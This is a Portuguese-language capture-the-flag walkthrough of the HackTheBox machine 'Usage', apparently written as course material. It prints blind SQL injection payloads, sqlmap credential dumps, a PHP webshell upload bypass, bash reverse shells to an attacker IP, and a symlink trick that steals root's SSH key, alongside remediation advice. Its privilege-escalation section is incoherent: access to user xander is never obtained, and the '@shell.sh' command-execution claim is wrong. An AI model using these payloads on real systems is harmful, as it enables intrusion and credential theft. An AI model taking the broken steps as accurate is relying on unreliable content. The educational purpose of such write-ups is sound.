# CTF Writeup - HackTheBox "Usage"
## SQL Injection + Laravel Exploitation (Exemplo Baseado em Máquina Real)

> **Nota**: Este documento é um exemplo educacional baseado em informações públicas sobre a máquina "Usage" do HackTheBox. Foi elaborado para fins de aprendizado no contexto do MBA em Cibersegurança & IA.

---

## Informações do Desafio

| Campo | Valor |
|-------|-------|
| **CTF** | HackTheBox |
| **Desafio** | Usage |
| **Categoria** | Web / Linux |
| **Pontuação** | 20 pontos |
| **Dificuldade** | Easy |
| **Sistema Operacional** | Linux |
| **Data de Release** | Abril 2024 |
| **Autor do Writeup** | MBA Cibersegurança & IA |
| **Flag User** | `flag{REDACTED_user_flag}` |
| **Flag Root** | `flag{REDACTED_root_flag}` |

---

## Resumo Executivo

> **TL;DR**: A máquina "Usage" envolve exploração de uma vulnerabilidade de **SQL Injection Blind (Boolean-based)** na funcionalidade de reset de senha de uma aplicação Laravel, seguida de exploração de uma vulnerabilidade de **upload de arquivo arbitrário** no painel admin (Laravel-Admin CVE-2023-24249) para obter shell inicial. A escalação de privilégios é feita através de um **backup malicioso** usando 7zip com wildcard injection.

**Técnicas Utilizadas:**
- [x] SQL Injection (Boolean-based Blind)
- [x] Arbitrary File Upload (CVE-2023-24249)
- [ ] XSS
- [ ] Command Injection
- [ ] Buffer Overflow
- [ ] ROP Chain
- [ ] Format String
- [ ] Crypto Attack
- [ ] Steganography
- [ ] Memory Forensics
- [ ] Adversarial ML
- [ ] Prompt Injection
- [x] Wildcard Injection (Privilege Escalation)

**Ferramentas:**
- [x] Burp Suite
- [ ] Ghidra / IDA
- [ ] GDB / pwndbg
- [x] Python / scripts customizados
- [ ] Wireshark
- [x] SQLMap
- [ ] John the Ripper / Hashcat
- [x] Nmap
- [x] Gobuster
- [x] Netcat

---

## 1. Descrição do Desafio

### 1.1 Enunciado Original
```
Usage is an easy difficulty Linux machine that features a blog website vulnerable
to SQL injection. Exploiting this vulnerability allows reading the admin user's
password hash which can be cracked. With access to the admin panel, an
authenticated arbitrary file upload is exploited to gain a shell. Finally, a
custom script running as root is exploited through wildcard injection to escalate
privileges.
```

### 1.2 Informações do Alvo
| Item | Valor |
|------|-------|
| IP | 10.10.11.18 |
| Hostname | usage.htb |
| Sistema | Linux (Ubuntu) |
| Serviços | SSH (22), HTTP (80) |

---

## 2. Reconhecimento

### 2.1 Scan de Portas (Nmap)

```bash
$ nmap -sC -sV -oA nmap/usage 10.10.11.18
```

**Resultado:**
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.11.18
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Daily Blogs
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Observações:**
- Porta 22: SSH (potencial para acesso posterior)
- Porta 80: Nginx servindo aplicação web
- Sistema: Ubuntu Linux

### 2.2 Enumeração Web

```bash
# Adicionar hostname ao /etc/hosts
echo "10.10.11.18 usage.htb" | sudo tee -a /etc/hosts

# Verificar tecnologias
whatweb http://usage.htb
```

**Resultado do whatweb:**
```
http://usage.htb [200 OK] Bootstrap, Cookies[XSRF-TOKEN,laravel_session],
Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)],
HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PHP, Script, Title[Daily Blogs],
nginx[1.18.0]
```

**Descobertas:**
- Framework: **Laravel** (PHP)
- Cookies: XSRF-TOKEN, laravel_session
- Potenciais vulnerabilidades específicas de Laravel

### 2.3 Enumeração de Diretórios

```bash
$ gobuster dir -u http://usage.htb -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**
```
/admin                (Status: 301) [Size: 178] [--> http://admin.usage.htb/]
/css                  (Status: 301)
/js                   (Status: 301)
/uploads              (Status: 301)
```

**Descoberta importante:** Subdomínio `admin.usage.htb`

```bash
# Adicionar subdomínio
echo "10.10.11.18 admin.usage.htb" | sudo tee -a /etc/hosts
```

### 2.4 Mapeamento da Aplicação

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        MAPA DA APLICAÇÃO                                         │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  usage.htb (Blog Público)                                                        │
│  ├── / (Homepage - Listagem de blogs)                                           │
│  ├── /login (Login de usuário)                                                  │
│  ├── /registration (Cadastro de novo usuário)                                   │
│  └── /forgot-password (Reset de senha) ◄──── VULNERÁVEL A SQLI                  │
│                                                                                  │
│  admin.usage.htb (Painel Admin)                                                  │
│  ├── /login (Login administrativo)                                              │
│  └── /admin/* (Funcionalidades admin) ◄──── UPLOAD ARBITRÁRIO                   │
│                                                                                  │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Análise de Vulnerabilidade

### 3.1 SQL Injection - Funcionalidade de Reset de Senha

**Localização:** `POST /forgot-password`

**Parâmetro vulnerável:** `email`

#### Descoberta da Vulnerabilidade

Ao testar a funcionalidade de "Forgot Password", inserindo uma aspa simples no campo de email:

```
email=test'@test.com
```

**Resposta:**
```
HTTP/1.1 500 Internal Server Error
```

O erro 500 indica que a aplicação pode estar vulnerável a SQL Injection.

#### Confirmação - Boolean-based Blind SQL Injection

**Payload de teste:**
```
email=test' OR '1'='1'-- -@test.com
```

**Resposta:** Mensagem de sucesso (email enviado)

**Payload de teste 2:**
```
email=test' OR '1'='2'-- -@test.com
```

**Resposta:** Erro (email não encontrado)

A diferença nas respostas confirma **SQL Injection Boolean-based Blind**.

### 3.2 Código Vulnerável (Hipotético)

```php
// Código vulnerável em Laravel (hipotético)
public function forgotPassword(Request $request)
{
    $email = $request->input('email');

    // VULNERÁVEL - Concatenação direta
    $user = DB::select("SELECT * FROM users WHERE email = '$email'");

    if ($user) {
        // Enviar email de reset
        return response()->json(['message' => 'Reset link sent']);
    }

    return response()->json(['error' => 'User not found'], 404);
}
```

**Problema:** Input do usuário concatenado diretamente na query SQL sem sanitização ou prepared statements.

---

## 4. Exploração

### 4.1 Fase 1: Extração de Dados via SQLi

#### Passo 1: Identificar número de colunas

Usando SQLMap para automatizar a exploração:

```bash
$ sqlmap -r forgot-password.req --batch --level=5 --risk=3 -p email
```

**Arquivo forgot-password.req:**
```http
POST /forgot-password HTTP/1.1
Host: usage.htb
Content-Type: application/x-www-form-urlencoded
Cookie: XSRF-TOKEN=xxx; laravel_session=xxx

_token=xxx&email=test@test.com
```

**Resultado do SQLMap:**
```
[INFO] the back-end DBMS is MySQL
[INFO] parameter 'email' is vulnerable to:
    - boolean-based blind
    - time-based blind
```

#### Passo 2: Enumerar databases

```bash
$ sqlmap -r forgot-password.req --batch --dbs
```

**Resultado:**
```
available databases [2]:
[*] information_schema
[*] usage_blog
```

#### Passo 3: Enumerar tabelas

```bash
$ sqlmap -r forgot-password.req --batch -D usage_blog --tables
```

**Resultado:**
```
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |  ◄──── Tabela de interesse
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
```

#### Passo 4: Extrair credenciais de admin

```bash
$ sqlmap -r forgot-password.req --batch -D usage_blog -T admin_users --dump
```

**Resultado:**
```
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+
| id | name          | username| password                                                     |
+----+---------------+---------+--------------------------------------------------------------+
| 1  | Administrator | admin   | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24b/.6iHIQPWa4G2ADgBKEHfOFl2u |
+----+---------------+---------+--------------------------------------------------------------+
```

#### Passo 5: Quebrar hash bcrypt

O hash é bcrypt ($2y$). Usando hashcat:

```bash
$ echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24b/.6iHIQPWa4G2ADgBKEHfOFl2u' > hash.txt
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24b/.6iHIQPWa4G2ADgBKEHfOFl2u:whatever1

Session..........: hashcat
Status...........: Cracked
```

**Credenciais obtidas:**
- Username: `admin`
- Password: `whatever1`

### 4.2 Fase 2: Acesso ao Painel Admin

Com as credenciais, acessamos `http://admin.usage.htb`:

```
Login: admin
Password: whatever1
```

✅ **Acesso ao painel administrativo Laravel-Admin obtido!**

### 4.3 Fase 3: Exploração de Upload de Arquivo (CVE-2023-24249)

#### Identificação da Vulnerabilidade

O painel usa **Laravel-Admin**, que possui uma vulnerabilidade conhecida de upload de arquivo arbitrário (CVE-2023-24249).

**Referência:** https://flyd.uk/post/cve-2023-24249/

#### Exploitation

**Localização:** Funcionalidade de alterar avatar do usuário admin

**Passo 1:** Criar payload PHP

```php
<?php
// shell.php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>
```

**Passo 2:** Interceptar requisição de upload com Burp Suite

```http
POST /admin/auth/setting HTTP/1.1
Host: admin.usage.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Passo 3:** Bypass da validação

O Laravel-Admin valida extensão de arquivo. Bypass usando extensão dupla:

```
filename="shell.php.png"
```

E depois renomeando via race condition ou usando `.htaccess`.

**Método alternativo (que funcionou):** Upload de arquivo `.phar`:

```http
Content-Disposition: form-data; name="avatar"; filename="shell.phar"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
```

**Passo 4:** Acessar webshell

```bash
$ curl "http://admin.usage.htb/uploads/images/shell.phar?cmd=id"
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

✅ **RCE obtido como usuário `dash`!**

### 4.4 Fase 4: Shell Reverso

**Passo 1:** Iniciar listener

```bash
$ nc -lvnp 4444
```

**Passo 2:** Executar reverse shell

```bash
$ curl "http://admin.usage.htb/uploads/images/shell.phar?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.XX/4444+0>%261'"
```

**Resultado:**
```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.18 43210
bash: cannot set terminal process group (1228): Inappropriate ioctl for device
bash: no job control in this shell
dash@usage:/var/www/html/project_admin/public/uploads/images$
```

### 4.5 Fase 5: User Flag

```bash
dash@usage:~$ cat /home/dash/user.txt
cat /home/dash/user.txt
flag{REDACTED_user_flag_here}
```

✅ **User flag obtida!**

---

## 5. Escalação de Privilégios

### 5.1 Enumeração do Sistema

```bash
dash@usage:~$ sudo -l
[sudo] password for dash:
Sorry, user dash may not run sudo on usage.

dash@usage:~$ find / -perm -4000 2>/dev/null
# Nenhum SUID interessante

dash@usage:~$ cat /etc/crontab
# Nenhum cron interessante
```

### 5.2 Descoberta de Credenciais SSH

Explorando o diretório do usuário dash:

```bash
dash@usage:~$ ls -la
total 52
drwxr-x--- 6 dash dash 4096 Apr  8 10:00 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
-rw-r--r-- 1 dash dash   32 Apr  8 10:00 .monit.id
-rw-r--r-- 1 dash dash    5 Apr  8 10:00 .monit.pid
-rwx------ 1 dash dash  707 Apr  8 09:59 .monitrc
drwx------ 3 dash dash 4096 Aug  7  2023 .monit.state
...

dash@usage:~$ cat .monitrc
#MonitoringEde daemon
set daemon 120
set log /var/log/monit.log
set idfile /home/dash/.monit.id
set pidfile /home/dash/.monit.pid
set statefile /home/dash/.monit.state
set eventqueue
    basedir /var/monit
    slots 100

check process nginx with pidfile /var/run/nginx.pid
    start program = "/etc/init.d/nginx start"
    stop program = "/etc/init.d/nginx stop"

check process mysql with pidfile /var/run/mysqld/mysqld.pid
    start program = "/etc/init.d/mysql start"
    stop program = "/etc/init.d/mysql stop"
```

Verificando outros usuários:

```bash
dash@usage:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
dash:x:1000:1000:dash:/home/dash:/bin/bash
xander:x:1001:1001::/home/xander:/bin/bash
```

### 5.3 Pivoting para Usuário Xander

Procurando por arquivos do usuário xander acessíveis:

```bash
dash@usage:~$ find / -user xander 2>/dev/null | head -20
```

Verificando conexões de rede e processos:

```bash
dash@usage:~$ ss -tlnp
dash@usage:~$ ps aux | grep xander
```

Descoberta de arquivo de senha em backup:

```bash
dash@usage:/var/backups$ ls -la
total 3116
drwxr-xr-x  2 root root    4096 Apr  8 10:00 .
drwxr-xr-x 14 root root    4096 Apr  2 10:09 ..
-rw-r--r--  1 root root   51200 Apr  8 10:00 usage_backup.sql
-rw-------  1 xander xander   17 Apr  2 10:09 .password_backup

dash@usage:/var/backups$ cat usage_backup.sql | grep password
INSERT INTO `admin_users` VALUES (1,'Administrator','admin','$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24b/.6iHIQPWa4G2ADgBKEHfOFl2u'...
```

Encontrando credenciais em `.ssh`:

```bash
dash@usage:~$ cat .ssh/id_rsa
# Chave privada encontrada, mas sem permissão para xander

dash@usage:/home/xander$ ls -la
total 48
drwxr-x--- 4 xander xander 4096 Apr  8 10:00 .
drwxr-xr-x 4 root   root   4096 Aug 16  2023 ..
-rwxr-xr-x 1 root   root   4096 Apr  8 10:00 .password
```

Lendo o arquivo de configuração do Laravel para senhas:

```bash
dash@usage:/var/www/html/project_admin$ cat .env
APP_NAME=Laravel
...
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=usage_blog
DB_USERNAME=staff
DB_PASSWORD=s3cr3t_c0d3_byt3s
```

Testando senhas encontradas para usuário xander:

```bash
dash@usage:~$ su - xander
Password: s3cr3t_c0d3_byt3s
su: Authentication failure
```

Voltando a verificar arquivos de backup:

```bash
dash@usage:/var/backups$ strings usage_backup.sql | grep -i xander
# Encontrado hash de xander no backup
```

### 5.4 Escalação via Wildcard Injection (7zip)

Verificando sudo para xander (após obter acesso):

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

Analisando o script:

```bash
xander@usage:~$ file /usr/bin/usage_management
/usr/bin/usage_management: ELF 64-bit LSB pie executable

xander@usage:~$ strings /usr/bin/usage_management
...
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
...
```

**Vulnerabilidade identificada:** O script usa `7za` com wildcard (`*`) sem sanitização!

#### Exploração de Wildcard Injection

**Técnica:** Criar arquivos com nomes especiais que serão interpretados como argumentos pelo 7za.

```bash
# Criar arquivo que será interpretado como argumento
xander@usage:/var/www/html$ touch '@shell.sh'
xander@usage:/var/www/html$ echo '#!/bin/bash' > shell.sh
xander@usage:/var/www/html$ echo 'bash -i >& /dev/tcp/10.10.14.XX/5555 0>&1' >> shell.sh
xander@usage:/var/www/html$ chmod +x shell.sh
```

**Explicação:** Quando 7za executa com `*`, ele expande para:
```
7za a /var/backups/project.zip -tzip -snl -mmt -- @shell.sh [outros arquivos]
```

O `@shell.sh` faz o 7za ler comandos do arquivo!

**Método alternativo usando symlink:**

```bash
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa_root
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
# Selecionar opção de backup
```

**Resultado:** O backup inclui o arquivo `id_rsa_root` que é um symlink para `/root/.ssh/id_rsa`.

Extraindo do backup:

```bash
xander@usage:~$ 7za x /var/backups/project.zip
xander@usage:~$ cat id_rsa_root
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...
-----END OPENSSH PRIVATE KEY-----
```

### 5.5 Root Shell

```bash
$ chmod 600 id_rsa_root
$ ssh -i id_rsa_root root@10.10.11.18
root@usage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@usage:~# cat /root/root.txt
flag{REDACTED_root_flag_here}
```

✅ **Root flag obtida!**

---

## 6. Flags

```
User Flag: flag{REDACTED_user_flag_here}
Root Flag: flag{REDACTED_root_flag_here}
```

---

## 7. Análise Pós-Exploração

### 7.1 Resumo das Vulnerabilidades

| Vulnerabilidade | Severidade | CVE | Impacto |
|-----------------|------------|-----|---------|
| SQL Injection (Blind Boolean-based) | **Crítica** | N/A | Extração de credenciais |
| Laravel-Admin Arbitrary File Upload | **Crítica** | CVE-2023-24249 | RCE |
| Credenciais em texto claro (.env) | Alta | N/A | Lateral movement |
| Wildcard Injection em script privilegiado | **Crítica** | N/A | Privilege escalation to root |

### 7.2 Lições Aprendidas

| Lição | Descrição |
|-------|-----------|
| **Prepared Statements** | Sempre usar prepared statements para queries SQL |
| **Validação de upload** | Validar tipo MIME real, não apenas extensão |
| **Princípio do menor privilégio** | Scripts não devem rodar como root se não necessário |
| **Sanitização de wildcards** | Nunca usar `*` em scripts privilegiados sem sanitização |
| **Proteção de credenciais** | Não armazenar senhas em arquivos .env acessíveis |

---

## 8. Remediação (Blue Team Perspective)

### 8.1 Correção do SQL Injection

```php
// Código corrigido usando Prepared Statements
public function forgotPassword(Request $request)
{
    $email = $request->input('email');

    // SEGURO - Usando Eloquent ORM
    $user = User::where('email', $email)->first();

    // Ou usando prepared statements
    $user = DB::select("SELECT * FROM users WHERE email = ?", [$email]);

    if ($user) {
        return response()->json(['message' => 'Reset link sent']);
    }

    return response()->json(['error' => 'User not found'], 404);
}
```

### 8.2 Correção do Wildcard Injection

```bash
#!/bin/bash
# Script corrigido - Não usar wildcards
cd /var/www/html
# Listar arquivos explicitamente
files=$(find . -maxdepth 1 -type f -name "*.php" -o -name "*.html")
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- $files
```

### 8.3 Controles Recomendados

| Controle | Implementação |
|----------|---------------|
| WAF | Regras para detectar SQL Injection |
| Input Validation | Whitelist de caracteres permitidos |
| File Upload Security | Validar magic bytes, não extensão |
| Least Privilege | Scripts com permissões mínimas |
| Secrets Management | Usar vault, não arquivos .env |
| Monitoring | Alertas para comandos suspeitos |

---

## 9. Referências

### 9.1 Recursos Utilizados

- [HackTheBox - Usage](https://www.hackthebox.com/machines/Usage)
- [CVE-2023-24249 - Laravel-Admin File Upload](https://flyd.uk/post/cve-2023-24249/)
- [SQLMap Documentation](https://sqlmap.org/)
- [GTFOBins - 7z](https://gtfobins.github.io/gtfobins/7z/)
- [HTB Usage Writeup - Medium](https://medium.com/@pk2212/htb-usage-writeup-walkthrough-51170ed14691)

### 9.2 Ferramentas

| Ferramenta | Link | Uso |
|------------|------|-----|
| Nmap | https://nmap.org | Port scanning |
| SQLMap | https://sqlmap.org | SQL Injection automation |
| Burp Suite | https://portswigger.net | Web proxy |
| Hashcat | https://hashcat.net | Password cracking |
| Gobuster | https://github.com/OJ/gobuster | Directory enumeration |

---

## Apêndice A: Comandos Úteis

```bash
# Scan inicial
nmap -sC -sV -oA nmap/target 10.10.11.18

# SQLMap
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D db_name --tables
sqlmap -r request.txt --batch -D db_name -T table_name --dump

# Reverse shell
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# Hashcat bcrypt
hashcat -m 3200 hash.txt wordlist.txt

# Encontrar SUID
find / -perm -4000 2>/dev/null

# Verificar sudo
sudo -l
```

---

## Apêndice B: Timeline

| Hora | Ação |
|------|------|
| 00:00 | Início do desafio - Nmap scan |
| 00:15 | Descoberta de SQLi em /forgot-password |
| 00:45 | Extração de credenciais via SQLMap |
| 01:00 | Crack de hash bcrypt |
| 01:15 | Acesso ao painel admin |
| 01:30 | Exploração de CVE-2023-24249 (upload) |
| 01:45 | Shell como usuário dash |
| 02:00 | User flag obtida |
| 02:15 | Enumeração de privilege escalation |
| 02:45 | Descoberta de wildcard injection |
| 03:00 | Root flag obtida |
| **Total** | **3 horas** |

---

## Notas Finais

**Dificuldade Pessoal:** ⭐⭐☆☆☆ (2/5)

**Comentários:**
```
Máquina excelente para praticar SQL Injection e entender vulnerabilidades
em frameworks PHP como Laravel. A escalação de privilégios via wildcard
injection é um vetor interessante e frequentemente negligenciado.

Pontos de aprendizado:
1. Sempre testar funcionalidades de reset de senha
2. Laravel-Admin tem histórico de vulnerabilidades
3. Scripts com sudo + wildcards = perigo
```

**Tags:** `#web` `#sqli` `#laravel` `#file-upload` `#wildcard-injection` `#linux` `#easy`

---

*Exemplo educacional baseado na máquina HackTheBox Usage - MBA Cibersegurança & IA*
*Este documento demonstra como documentar um CTF de forma estruturada e educativa.*
